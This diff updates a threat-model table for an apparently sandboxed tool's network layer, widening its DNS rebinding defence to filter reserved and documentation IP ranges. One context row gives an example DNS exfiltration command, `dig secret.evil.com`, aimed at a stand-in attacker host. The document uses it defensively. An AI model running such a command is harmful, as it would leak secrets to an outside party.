@@ -855,7 +855,7 @@ from `result.stdout`/`stderr` before display.
 | ID | Threat | Attack Vector | Mitigation | Status |
 |----|--------|--------------|------------|--------|
 | TM-NET-001 | DNS spoofing | Resolve to wrong IP | No DNS resolution | **MITIGATED** |
-| TM-NET-002 | DNS rebinding | Rebind after allowlist check | Literal host matching + `PrivateIpFilteringResolver` blocks private IPs at connect time | **MITIGATED** |
+| TM-NET-002 | DNS rebinding | Rebind after allowlist check | Literal host matching + `PrivateIpFilteringResolver` filters private and reserved IPs at connect time, including IPv4 TEST-NET and IPv6 documentation ranges | **MITIGATED** |
 | TM-NET-003 | DNS exfiltration | `dig secret.evil.com` | No DNS commands | **MITIGATED** |
 
 **Current Risk**: NONE. Implementation: `network/allowlist.rs::matches_pattern()`, allowlist
